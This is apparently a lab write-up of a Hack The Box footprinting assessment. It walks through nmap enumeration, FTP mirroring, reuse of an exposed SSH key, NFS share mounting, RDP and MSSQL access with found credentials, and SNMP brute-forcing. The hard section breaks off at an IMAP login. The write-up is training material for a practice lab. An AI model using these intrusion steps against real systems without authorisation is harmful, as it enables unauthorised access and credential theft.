---
description: Skills Assessment
---

# Footprinting Labs

## Footprinting Lab - Easy

### What is given

* company name: **`Inlanefreight Ltd`**
* given server: **`DNS`**
* found credentials: "**`ceil:qwer1234`**"
* admins have stored a "**`flag.txt`**" file on the server, we should obtain its content

### Questions

#### 1. Enumerate the server carefully and find the flag.txt file. Submit the contents of this file as the answer.

**`sudo nmap -sVC 10.129.72.126`**

* 21 ftp - ProFTPD Server (ftp.int.inlanefreight.htb)
* 22 ssh - OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
* 53 domain - ISC BIND 9.16.1, dns-nsid: bind.version: 9.16.1-Ubuntu
* 2121 ftp - ProFTPD Server (Ceil's FTP)
* CONCLUSION
  * FTP: 21 is a real FTP server, 2121 is just a proxy to the real one&#x20;
  * SSH: We dont have keys for login, it might be in the FTP server...

dig soa \<IP>

* AUTHORITY SECTION: . 5 IN SOA **`a.root-servers.net`. `nstld.verisign-grs.com`**. 2023091101 1800 900 604800 86400

ssh ceil@10.129.72.126

* "`ceil@10.129.72.126: Permission denied (publickey).`"

ftp 10.129.72.126

* logged in, nothing to be found

**`wget -m --no-passive ftp://ceil:qwer1234@10.129.72.126:2121`**

* downloaded all the FTP files to local machine
* cd 10.129.72.126:2121 -> ls -la (**`.bash_history`**) -> cat **`.bash_history`**
  * `ls -al mkdir ssh cd ssh/ echo "test" > id_rsa id ssh-keygen -t rsa -b 4096 cd .. rm -rf ssh/ ls -al cd .ssh/ cat id_rsa ls a-l ls -al cat id_rsa.pub >> authorized_keys cd .. cd /home cd ceil/ ls -l ls -al mkdir flag cd flag/ touch flag.txt vim flag.txt cat flag.txt ls -al mv flag/flag.txt .`
* cd 10.129.72.126:2121 -> ls -la (**`.ssh`**) -> cd .ssh -> ls -la (**`id_rsa`**)
* **`chmod 600 id_rsa`**
* **`sftp -i id_rsa ceil@10.129.72.126`**
* **`cd ..`**
* **`ls -la`**
* **`cd flag`**
* **`ls`**
* **`get flag.txt`**
* LOCAL machine: **`cat flag.txt`**



## Footprinting Lab - Medium

### What is given

* everyone on the internal network has access to the server
* user named **`HTB`**
* we need to obtain credentials of this user as proof

### Questions

1. **Enumerate the server carefully and find the username "HTB" and its password. Then, submit this user's password as the answer.**

**`sudo nmap -sVC 10.129.169.252`**

* 111 rpcbind - version 2-4
* 135 msrpc
* 139 netbios-ssn
* 445 microsoft-ds?
* 2049 mountd 1-3
* 3389 ms-wbt-server - info: WINMEDIUM, Product\_Version: 10.0.17763
* \+ smb host scripts (smb2-security-mode: 311)
* Conclusion:
  * looks like NFS because of rpc

`rpcclient -U "" 10.129.45.189`

* Cannot connect to server. Error was NT\_STATUS\_LOGON\_FAILURE

**`showmount -e 10.129.169.252`**

* ![](<.gitbook/assets/image (12) (1).png>)

`sudo nmap 10.129.169.252 --script nfs* -p111,2049 -sV`

`mkdir target-NFS`

**`sudo mount -t nfs 10.129.169.252:/TechSupport ./target-NFS/ -o nolock`**

cd target-NFS

ls -la => many tickets, but only one with some data

**`cat ticket4238791283782.txt`**

* domain="10.129.2.59:9500"&#x20;
* path=/login
* from="alex.g@web.dev.inlanefreight.htb"
* user="**alex**"
* password="**lol123!mD**"
* port = 25 (SMTP)
* host=smtp.web.dev.inlanefreight.htb

**`remmina`**

* RDP = 10.129.169.252
* username = alex
* password = lol123!mD
* domain = 10.129.2.59:9500

We successfully connected using RDp to alex Windows machine, it contains MSQL Server Management Studio 18, but we dont have access to it...lets find the PW for su user to get access into DB with PW

![](<.gitbook/assets/image (13) (1).png>)![](<.gitbook/assets/image (14) (1).png>)

Searching the alex Windows machine -> c:/users/alex/devshare/important.txt => **`sa:87N1ns@slls83`**

* login doesnt work
* RUN MSSQLServer as ADMIN with found PW (87N1...)
  * we are in the DB
  * New Query -> **`select * from accounts.dbo.devsacc where name = ‘htb’;`**
  * ![](<.gitbook/assets/image (15).png>)



## Footprinting Lab - Hard

### What is given

* MX and management server for the internal network
* server has the function of a backup server for the internal accounts in domain
* user named **`HTB`**

### Questions

1. **Enumerate the server carefully and find the username "HTB" and its password. Then, submit HTB's password as the answer.**

**`sudo nmap -sVC 10.129.251.207`**

* 22 SSH
* 110 POP3 - Dovecot pop3d
* 143 IMAP - Dovecot imapd (Ubuntu)
* 993 IMAPS?
* 995 POP3S?
* CONCLUSION -> looks like we wanna use what we learned from IMAP/POP3 module...

**`openssl s_client -connect 10.129.251.207:pop3s`**

**`onesixtyone -c /usr/share/SecLists/Discovery/SNMP/snmp.txt 10.129.251.207`**

\=> ![](<.gitbook/assets/image (14).png>)

\=> we obtained the hostname \[XXX], lets dive deeper

**`braa XXX@10.129.251.207:.1.3.6.*`**

\=> ![](<.gitbook/assets/image (1) (1).png>)![](<.gitbook/assets/image (2) (1).png>)

\=> we obtained the credentials of a user "tom" - lets try these

**`curl -k 'imaps://10.129.251.207' –user XXX:XXX -v`**

**`1 SELECT INBOX`**



